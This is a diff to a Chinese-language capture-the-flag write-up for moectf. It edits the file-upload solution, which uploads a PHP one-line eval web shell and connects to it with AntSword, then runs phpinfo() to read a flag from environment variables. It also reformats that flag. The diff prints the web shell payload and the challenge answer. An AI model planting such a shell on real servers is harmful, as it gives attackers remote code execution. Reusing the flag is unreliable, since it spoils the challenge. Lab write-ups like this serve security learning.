@@ -56,7 +56,7 @@ if __name__ == "__main__":
 
 [浅谈php一句话木马](https://xz.aliyun.com/t/6957)
 
-完全没有过滤，那很简单，直接上传包含一句话木马 `<?php @eval ($_POST['1']);` 的 1.php 文件，并使用中国蚁剑连接。
+完全没有过滤，那很简单，直接上传包含一句话木马 `<?php @eval ($_POST['1']); ?>` 的 1.php 文件，并使用中国蚁剑连接。
 
 当然，参考于第一题 flag 在环境变量中，我们直接以 POST 的形式提交 `1=phpinfo();`  就可以将其输出，之后 `ctrl+f` 查找即可。
 
@@ -70,7 +70,7 @@ if __name__ == "__main__":
 
 > [!FLAG]
 >
-> moectf{bYP@S5-tHE_MImE_tyPE_@nd-ExTen5i0N-y0u_C@N-Do-It2}
+> `moectf{bYP@S5-tHE_MImE_tyPE_@nd-ExTen5i0N-y0u_C@N-Do-It2}`
 
 #### 04 一个文件浏览器
 
